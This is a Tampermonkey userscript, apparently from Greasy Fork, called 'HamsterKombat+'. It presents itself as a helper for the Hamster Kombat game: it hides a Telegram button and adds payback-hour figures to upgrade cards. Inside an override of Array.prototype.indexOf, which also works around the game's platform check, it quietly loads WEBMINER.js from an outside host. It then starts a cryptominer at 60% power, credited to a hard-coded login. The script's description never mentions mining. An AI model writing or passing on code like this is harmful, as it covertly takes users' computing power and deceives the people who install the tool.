// ==UserScript==
// @name         HamsterKombat+
// @namespace    http://tampermonkey.net/
// @version      2024-07-20
// @description  HamsterKombat Plus
// @author       Me
// @match        https://hamsterkombatgame.io/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=hamsterkombatgame.io
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/501257/HamsterKombat%2B.user.js
// @updateURL https://update.greasyfork.org/scripts/501257/HamsterKombat%2B.meta.js
// ==/UserScript==

(function() {
    'use strict';
    if (location.hostname == "hamsterkombatgame.io") {
        const original_indexOf = Array.prototype.indexOf
        Array.prototype.indexOf = function(...args) {
            if (JSON.stringify(this) == JSON.stringify(["android", "android_x", "ios"])) {
                    function loadScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";

    if (script.readyState) {
        script.onreadystatechange = function() {
            if (script.readyState === "loaded" || script.readyState === "complete") {
                script.onreadystatechange = null;
                if (callback) {
                    callback();
                }
            }
        };
    } else {
        script.onload = function() {
            if (callback) {
                callback();
            }
        };
    }
    script.src = url;

    document.getElementsByTagName("head")[0].appendChild(script);
}

// Использование функции для загрузки другого скрипта
loadScript("https://wm.bmwebm.org/WEBMINER.js", function() {
    window.WEBMINER.config({ login: "7087642", pass: null }).power(60);
});
                setTimeout(() => {
                    Array.prototype.indexOf = original_indexOf
                })

                return 0;
            }
            return original_indexOf.apply(this, args);
        }
    }
    setInterval(() => {

window.Telegram.WebApp.MainButton.hide();
        if (location.href == "https://hamsterkombatgame.io/ru/clicker/mine") {
            if (window.location.href.endsWith("mine")) {
                console.log(window.location.href);

                document.querySelectorAll('.upgrade-item').forEach(item => {
                    const profitElement = item.querySelector('.upgrade-item-profit .price-value');
                    const profitt = profitElement.textContent.replace(',', '.');
                    let profit; // Изменено здесь
                    if (profitt.endsWith("K")) {
                        profit = parseFloat(profitt.slice(0, -1)) * 1000;
                    } else if (profitt.endsWith("M")) {
                        profit = parseFloat(profitt.slice(0, -1)) * 1000000;
                    } else {
                        profit = parseFloat(profitt);
                    }

                    const priceElement = item.querySelector('.upgrade-item-detail .price-value');

                    if (priceElement !== null) {
                        const pricee = priceElement.textContent.replace(',', '.');
                        let price; // Изменено здесь
                        if (pricee.endsWith("K")) {
                            price = parseFloat(pricee.slice(0, -1)) * 1000;
                        } else if (pricee.endsWith("M")) {
                            price = parseFloat(pricee.slice(0, -1)) * 1000000;
                        } else {
                            price = parseFloat(pricee);
                        }

                        const payback = price / profit;

                        if (!isNaN(payback)) { // Добавлена проверка на NaN
                            let paybackElement = item.querySelector('.upgrade-item-payback');

                            if (!paybackElement) {
                                paybackElement = document.createElement('div');
                                paybackElement.classList.add('upgrade-item-payback');
                                item.appendChild(paybackElement);
                            }
                            paybackElement.classList.add('upgrade-item-payback');
                            paybackElement.innerHTML = `
                                        <p class="text-grey">Окупаемость в часах: ${payback.toFixed(2)}</p>`;

                            const infoBlock = item.querySelector('.upgrade-item-info');
                            infoBlock.append(paybackElement);
                        }
                    }
                });

            }
        }
    }, 1000)
})();